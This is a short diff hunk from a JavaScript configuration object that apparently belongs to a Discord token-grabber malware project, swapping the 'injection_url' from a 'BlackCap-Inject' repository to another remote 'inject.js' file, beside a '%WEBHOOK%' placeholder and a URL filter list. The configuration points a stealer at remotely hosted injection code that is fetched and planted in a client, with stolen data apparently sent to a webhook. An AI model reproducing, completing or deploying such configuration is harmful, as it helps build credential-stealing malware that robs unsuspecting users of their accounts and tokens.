@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/TrapSKapLAp/trap/main/inject.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
